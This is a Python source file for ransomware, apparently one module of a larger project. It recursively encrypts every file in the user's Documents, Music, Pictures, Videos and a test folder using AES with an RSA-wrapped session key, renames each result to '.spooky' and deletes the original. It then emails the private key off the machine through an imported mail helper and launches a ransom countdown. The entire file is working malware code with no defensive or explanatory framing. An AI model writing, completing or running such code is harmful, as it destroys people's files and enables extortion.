import base64
import os
import random
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from generatekey import generate_key
from countdown import run_countdown
from sendemail import send_mail
 
current_directory = os.getcwd()
search_directory = current_directory  # This will now search in the current directory using its absolute path

# List all files in the search_directory
files = os.listdir(search_directory)

# Iterate over the files and filter the ones that end with "_public.pem" or "_private.pem"
for file in files:
    full_path = os.path.join(search_directory, file)
    if file.endswith("_public.pem"):
        os.remove(full_path)  # Removing using the full path
        #matching_public_files.append(file)
    elif file.endswith("_private.pem"):
        os.remove(full_path)  # Removing using the full path
 
reference_number, privateKey, publicKey, private_name = generate_key()
pubKeyBytes = publicKey
privateKeyBytes = privateKey

def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, pubKeyBytes):
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # convert data to bytes
    data = bytes(data)

    key = RSA.import_key(pubKeyBytes)

    # Generate the session key
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipherRSA = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipherRSA.encrypt(sessionKey)

    # encrypt the data with the session key
    cipherAES = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipherAES.encrypt_and_digest(data)
    
    # Get the length of the extension
    extension_length = len(extension)
    # Convert extension_length to bytes (assuming it will be less than 256)
    extension_length_bytes = extension_length.to_bytes(1, 'big')
    # Prepend the extension_length and extension to the ciphertext
    ciphertext = extension_length_bytes + extension.encode() + ciphertext

    # save the encrypted data to file
    fileName = dataFile.split(extension)[0]
    fileExtension = '.spooky'
    encryptedFile = fileName + fileExtension
    
    with open(encryptedFile, 'wb') as f:
        data_to_write = [encryptedSessionKey, cipherAES.nonce, tag, ciphertext]
        for data in data_to_write:
            f.write(data)
    
    os.remove(dataFile)

username = os.environ.get('USER')

directories = [f'/home/{username}/testfiles',f'/home/{username}/Documents',f'/home/{username}/Music',f'/home/{username}/Pictures',f'/home/{username}/Videos']
excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
for directory in directories:    
    for item in scanRecurse(directory):
        fileName = item.name
        filePath = Path(item)
        fileType = filePath.suffix.lower()
        print(fileName)

        if fileType in excludeExtension or fileName == "reference_number.txt":
            continue
            
        encrypt(filePath, pubKeyBytes)
    
send_mail(privateKeyBytes, private_name)
run_countdown(reference_number)
